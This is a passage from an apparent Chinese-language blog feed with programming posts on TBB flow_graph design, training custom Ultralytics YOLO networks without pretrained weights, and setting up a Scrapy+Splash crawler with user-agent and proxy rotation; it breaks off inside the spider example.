动态图结构：可以在运行时动态地添加或删除节点和边，使得 flow_graph 可以适应不同的处理需求和场景。<br>
响应式调整：根据数据流和任务的特性，flow_graph 可以动态地调整任务调度和资源分配。</li>
</ol>
<h2 id="设计思想"><a class="markdownIt-Anchor" href="#设计思想"></a> 设计思想</h2>
<p>创建和实现 flow_graph 网络时，你需要采用一种结构化和模块化的思维方式，这对于有效地利用 flow_graph 的并行编程模型至关重要。以下是一些关键的思维方式和实现细节：</p>
<ol>
<li>问题分解<br>
任务分解：将你的问题分解成更小、更可管理的部分。每个部分应该代表一个清晰定义的任务或数据处理步骤。<br>
节点映射：确定哪些任务可以并行执行，哪些任务需要顺序执行。为每个独立的任务创建一个 flow_graph 节点。</li>
<li>确定节点类型<br>
功能性节点：根据任务的性质选择合适的节点类型。例如，使用 function_node 来执行独立的计算任务，使用 join_node 来同步多个并行任务的输出。<br>
数据源与消费者：识别数据的来源和去向，使用 source_node 生成数据，使用 continue_node 或 sink_node 处理最终结果。</li>
<li>构建数据流<br>
连接节点：使用边（edges）明确定义节点之间的数据流向。确保数据能够按照正确的顺序和依赖关系流动。<br>
循环与条件逻辑：如果需要，可以在图中创建循环和条件分支，但要小心管理这些结构以避免死锁和资源浪费。</li>
<li>类与对象设计<br>
封装：为每个任务创建类或对象，封装相关的数据和方法。这有助于代码的可读性和可维护性。<br>
接口设计：定义清晰的接口和交互方式，使得类与 flow_graph 节点之间的交云能够顺畅、高效。</li>
<li>并行与性能<br>
并行策略：合理分配任务到不同的节点，平衡负载，避免单个节点成为性能瓶颈。<br>
资源管理：管理线程数量和资源分配，确保既能充分利用系统资源，又不会过载。</li>
<li>调试与测试<br>
单元测试：为每个类和节点编写单元测试，确保它们在独立情况下能正常工作。<br>
整体测试：测试整个流图的执行，确保数据流正确，任务按预期完成。</li>
<li>优化与重构<br>
性能分析：定期分析应用的性能，识别瓶颈。<br>
迭代优化：根据性能分析结果进行优化，可能包括重构代码、调整并行策略或优化数据结构。<br>
实践建议<br>
逐步构建：从一个基本的流图开始，逐步增加复杂性。这有助于理解每个部分是如何工作的，并在过程中调整设计。<br>
文档记录：记录你的设计决策和实现细节，这对于长期维护和团队协作非常重要。<br>
通过以上的思维方式和步骤，你可以更有效地创建和实现 flow_graph 网络，从而构建高效、可扩展的并行应用程序。记住，每个应用程序的具体需求可能有所不同，因此在实践中可能需要根据特定情况调整这些指导原则。</li>
</ol>
]]></content>
      <categories>
        <category>tbb</category>
      </categories>
      <tags>
        <tag>tbb</tag>
        <tag>多线程</tag>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Ultralytics库跑自己的网络</title>
    <url>/2023/10/30/21-07-56/</url>
    <content><![CDATA[<p>Ultralytics库提供的训练记录和数据可视化很好，但是自己改网络时又不方便用这些，在此我提供一些方法：</p>
<ol>
<li>让Ultralytics库能够训练自定义网络</li>
<li>自定义的网络如何不使用权重就能训练。</li>
</ol>
<span id="more"></span>
<h2 id="如何让ultralytics库能够训练自定义网络"><a class="markdownIt-Anchor" href="#如何让ultralytics库能够训练自定义网络"></a> 如何让Ultralytics库能够训练自定义网络</h2>
<p>Ultralytics提供了方法让用户能够自定义网络，我们可以创建一个这样的yaml文件，这里我拿官方的做个演示。</p>
<pre class="line-numbers language-yaml" data-language="yaml"><code class="language-yaml"><span class="token comment"># Ultralytics YOLO 🚀, AGPL-3.0 license</span>
<span class="token comment"># YOLOv8 object detection model with P3-P5 outputs. For Usage examples see https://docs.ultralytics.com/tasks/detect</span>

<span class="token comment"># Parameters</span>
<span class="token key atrule">nc</span><span class="token punctuation">:</span> <span class="token number">80</span>  <span class="token comment"># number of classes</span>
<span class="token key atrule">scales</span><span class="token punctuation">:</span> <span class="token comment"># model compound scaling constants, i.e. 'model=yolov8n.yaml' will call yolov8.yaml with scale 'n'</span>
  <span class="token comment"># [depth, width, max_channels]</span>
  <span class="token key atrule">n</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0.33</span><span class="token punctuation">,</span> <span class="token number">0.25</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">]</span>  <span class="token comment"># YOLOv8n summary: 225 layers,  3157200 parameters,  3157184 gradients,   8.9 GFLOPs</span>
  <span class="token key atrule">s</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0.33</span><span class="token punctuation">,</span> <span class="token number">0.50</span><span class="token punctuation">,</span> <span class="token number">1024</span><span class="token punctuation">]</span>  <span class="token comment"># YOLOv8s summary: 225 layers, 11166560 parameters, 11166544 gradients,  28.8 GFLOPs</span>
  <span class="token key atrule">m</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">0.67</span><span class="token punctuation">,</span> <span class="token number">0.75</span><span class="token punctuation">,</span> <span class="token number">768</span><span class="token punctuation">]</span>   <span class="token comment"># YOLOv8m summary: 295 layers, 25902640 parameters, 25902624 gradients,  79.3 GFLOPs</span>
  <span class="token key atrule">l</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1.00</span><span class="token punctuation">,</span> <span class="token number">1.00</span><span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">]</span>   <span class="token comment"># YOLOv8l summary: 365 layers, 43691520 parameters, 43691504 gradients, 165.7 GFLOPs</span>
  <span class="token key atrule">x</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token number">1.00</span><span class="token punctuation">,</span> <span class="token number">1.25</span><span class="token punctuation">,</span> <span class="token number">512</span><span class="token punctuation">]</span>   <span class="token comment"># YOLOv8x summary: 365 layers, 68229648 parameters, 68229632 gradients, 258.5 GFLOPs</span>

<span class="token comment"># YOLOv8.0n backbone</span>
<span class="token key atrule">backbone</span><span class="token punctuation">:</span>
  <span class="token comment"># [from, repeats, module, args]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 0-P1/2</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 1-P2/4</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">,</span> <span class="token boolean important">True</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 3-P3/8</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token boolean important">True</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 5-P4/16</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span> <span class="token boolean important">True</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 7-P5/32</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token boolean important">True</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> SPPF<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 9</span>

<span class="token comment"># YOLOv8.0n head</span>
<span class="token key atrule">head</span><span class="token punctuation">:</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nn.Upsample<span class="token punctuation">,</span> <span class="token punctuation">[</span>None<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'nearest'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Concat<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># cat backbone P4</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 12</span>

  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> nn.Upsample<span class="token punctuation">,</span> <span class="token punctuation">[</span>None<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token string">'nearest'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Concat<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># cat backbone P3</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 15 (P3/8-small)</span>

  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">256</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Concat<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># cat head P4</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 18 (P4/16-medium)</span>

  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Conv<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">512</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Concat<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># cat head P5</span>
  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token number">-1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> C2f<span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># 21 (P5/32-large)</span>

  <span class="token punctuation">-</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token number">21</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> Detect<span class="token punctuation">,</span> <span class="token punctuation">[</span>nc<span class="token punctuation">]</span><span class="token punctuation">]</span>  <span class="token comment"># Detect(P3, P4, P5)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以发现大致分为四个部分:</p>
<ul>
<li>
<p>nc: 分类或者检测任务的类别数量</p>
</li>
<li>
<p>scales: 缩放,用来调整模型大小</p>
</li>
<li>
<p>backbone: 模型的主干网络。它负责从输入图像中提取特征。</p>
<ul>
<li>from: 从哪一层开始。</li>
<li>repeats: 模块重复次数。</li>
<li>module: 使用的模块（例如，Conv代表卷积层）。</li>
<li>args: 模块参数。<br>
例如：[-1, 1, Conv, [64, 3, 2]] 表示从上一层（-1）开始，添加一个卷积层，该层有64个输出通道，3x3的卷积核，核步幅为2。</li>
</ul>
</li>
<li>
<p>head: 这是模型的头部网络，负责根据主干网络的特征进行目标检测。</p>
<ul>
<li>同样使用 from, repeats, module, args 参数。</li>
<li>特殊的如 nn.Upsample, 是上采样层。</li>
<li>Concat 用于合并不同层的特征。<br>
例如：[[-1, 6], 1, Concat, [1]] 表示取上一层（-1）和第6层的输出进行沿着第1个维度（通常是通道维度）的拼接。</li>
<li>最后，[[15, 18, 21], 1, Detect, [nc]] 是检测层，它将使用第15层、第18层和第21层的输出进行目标检测。</li>
</ul>
</li>
</ul>
<p>修改对应的就行了,不过这里中间使用的函数不来自于PyTorch,而是Ultralytics二次封装过的,使用时需要注意.</p>
<h2 id="如何不使用预训练权重训练网络"><a class="markdownIt-Anchor" href="#如何不使用预训练权重训练网络"></a> 如何不使用预训练权重训练网络</h2>
<p>Ultralytics训练的时候有个不好,就是一定要有个预训练权重.对于修改不多的网络,可以考虑加载预训练模型(会有部分数据保留的,应该对训练有帮助).但是我们创建自己的网络的时候(如果你是和我一样瞎搓的话)根本没有这个"预训练权重".虽然随便加载一个权重都行,不过网络不同应该还是有些影响的.下面给出使用:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> ultralytics <span class="token keyword">import</span> YOLO

<span class="token comment"># 一定要加这个,训练过程是异步的,不加报错</span>
<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>
    
    <span class="token comment"># 你自定义的网络配置,不是训练配置什么的</span>
    cfg <span class="token operator">=</span> <span class="token string">"xxx.yaml"</span>

    <span class="token comment"># 正常做法</span>
    model <span class="token operator">=</span> YOLO<span class="token punctuation">(</span>cfg<span class="token punctuation">)</span>
    model<span class="token punctuation">.</span>train<span class="token punctuation">(</span>
        data<span class="token operator">=</span><span class="token string">"dataset"</span><span class="token punctuation">,</span> <span class="token comment"># 数据集要按照标准,分类的话下面放train和val,里面一类一个文件夹</span>
        epochs<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>
        model<span class="token operator">=</span><span class="token string">"random_initial_weights.pt"</span><span class="token punctuation">,</span>
        device<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>

    <span class="token comment"># 无权重做法</span>
    model <span class="token operator">=</span> YOLO<span class="token punctuation">(</span><span class="token punctuation">)</span>
    model<span class="token punctuation">.</span>__init__<span class="token punctuation">(</span>cfg<span class="token punctuation">)</span> <span class="token comment"># 一步拆两步就行,研究半天源码</span>
    model<span class="token punctuation">.</span>train<span class="token punctuation">(</span>
        data<span class="token operator">=</span><span class="token string">"dataset"</span><span class="token punctuation">,</span> <span class="token comment"># 数据集要按照标准,分类的话下面放train和val,里面一类一个文件夹</span>
        epochs<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span>
        <span class="token comment"># 无需权重,照样训练</span>
        device<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
]]></content>
      <categories>
        <category>深度学习</category>
      </categories>
      <tags>
        <tag>深度学习</tag>
        <tag>Ultralytics</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Scrapy+splash写爬虫</title>
    <url>/2023/10/11/17-28-56/</url>
    <content><![CDATA[<p>使用scrapy和scrapy-splash开发爬虫可以高效处理JS渲染的网页。scrapy-splash是为scrapy设计的，用于与Splash协同工作，Splash是一个JavaScript渲染服务。</p>
<span id="more"></span>
<h2 id="环境设置"><a class="markdownIt-Anchor" href="#环境设置"></a> 环境设置</h2>
<ul>
<li>
<p>安装scrapy和scrapy-splash<br>
<code>pip install scrapy scrapy-splash</code></p>
</li>
<li>
<p>运行Splash服务（这里用Docker部署）<br>
docker run -p 8050:8050 scrapinghub/splash</p>
</li>
</ul>
<h2 id="scrapy项目设置"><a class="markdownIt-Anchor" href="#scrapy项目设置"></a> scrapy项目设置</h2>
<ul>
<li>使用<code>scrapy startproject projectName</code>创建项目。</li>
<li>使用<code>scrapy genspider spiderName xxx.com</code>创建爬虫。</li>
<li>在<code>settings.py</code>中添加以下设置来使用<code>SplashMiddleware</code>:</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">SPLASH_URL <span class="token operator">=</span> <span class="token string">'http://localhost:8050'</span>

DOWNLOADER_MIDDLEWARES <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'scrapy_splash.SplashCookiesMiddleware'</span><span class="token punctuation">:</span> <span class="token number">723</span><span class="token punctuation">,</span>
    <span class="token string">'scrapy_splash.SplashMiddleware'</span><span class="token punctuation">:</span> <span class="token number">725</span><span class="token punctuation">,</span>
    <span class="token string">'scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware'</span><span class="token punctuation">:</span> <span class="token number">810</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

SPIDER_MIDDLEWARES <span class="token operator">=</span> <span class="token punctuation">{</span>
    <span class="token string">'scrapy_splash.SplashDeduplicateArgsMiddleware'</span><span class="token punctuation">:</span> <span class="token number">100</span><span class="token punctuation">,</span>
<span class="token punctuation">}</span>

DUPEFILTER_CLASS <span class="token operator">=</span> <span class="token string">'scrapy_splash.SplashAwareDupeFilter'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在<code>middlewares.py</code>的<code>DownloaderMiddleware</code>中配置UA和代理ip（如果需要——</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
    self<span class="token punctuation">.</span>user_agents <span class="token operator">=</span> <span class="token punctuation">[</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span><span class="token punctuation">,</span>
        <span class="token string">"Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 "</span>
        <span class="token string">"(KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"</span>
    <span class="token punctuation">]</span>

<span class="token keyword">def</span> <span class="token function">process_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> request<span class="token punctuation">,</span> spider<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># Called for each request that goes through the downloader</span>
    <span class="token comment"># middleware.</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>ip_times <span class="token operator">%</span> <span class="token number">50</span> <span class="token operator">==</span> <span class="token number">49</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>ip <span class="token operator">=</span> get_proxy<span class="token punctuation">(</span><span class="token punctuation">)</span>
    self<span class="token punctuation">.</span>ip_times <span class="token operator">+=</span> <span class="token number">1</span>
    request<span class="token punctuation">.</span>meta<span class="token punctuation">[</span><span class="token string">'proxy'</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>ip
    request<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">'User-Agent'</span><span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>choice<span class="token punctuation">(</span>self<span class="token punctuation">.</span>user_agents<span class="token punctuation">)</span>
    request<span class="token punctuation">.</span>cookies <span class="token operator">=</span> cookies
    <span class="token comment"># print(request.headers['User-Agent'])</span>
    <span class="token comment"># print(request.cookies)</span>
    <span class="token comment"># Must either:</span>
    <span class="token comment"># - return None: continue processing this request</span>
    <span class="token comment"># - or return a Response object</span>
    <span class="token comment"># - or return a Request object</span>
    <span class="token comment"># - or raise IgnoreRequest: process_exception() methods of</span>
    <span class="token comment">#   installed downloader middleware will be called</span>
    <span class="token keyword">return</span> <span class="token boolean">None</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="编写spider"><a class="markdownIt-Anchor" href="#编写spider"></a> 编写Spider</h2>
<ul>
<li>使用<code>scrapy_splash.SplashRequest</code>来请求需要通过Splash渲染的页面,例如获取渲染后的页面源码:</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> scrapy
<span class="token keyword">from</span> scrapy_splash <span class="token keyword">import</span> SplashRequest

<span class="token keyword">class</span> <span class="token class-name">MySpider</span><span class="token punctuation">(</span>scrapy<span class="token punctuation">.</span>Spider<span class="token punctuation">)</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> <span class="token string">'my_spider'</span>
    start_urls <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'http://example.com'</span><span class="token punctuation">]</span>

    <span class="token keyword">def</span> <span class="token function">start_requests</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> url <span class="token keyword">in</span> self<span class="token punctuation">.</span>start_urls<span class="token punctuation">:</span>
            <span class="token keyword">yield</span> SplashRequest<span class="token punctuation">(</span>url<span class="token punctuation">,</span> self<span class="token punctuation">.</span>parse_result<span class="token punctuation">,</span> args<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">'wait'</span><span class="token punctuation">:</span> <span class="token number">2</span><span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">parse_result</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> response<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment"># 这里的response是渲染后的页面内容</span>
        <span class="token keyword">pass</span>
